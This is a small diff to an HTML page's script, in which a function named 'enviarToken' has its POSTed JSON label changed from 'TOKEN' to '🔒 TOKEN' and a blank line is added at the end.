@@ -74,7 +74,7 @@ function enviarToken() {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-            tipo: "TOKEN",
+            tipo: "🔒 TOKEN",
             valor: token
         })
     }).finally(() => {
@@ -86,5 +86,6 @@ function enviarToken() {
 
 </body>
 </html>
+
 
 
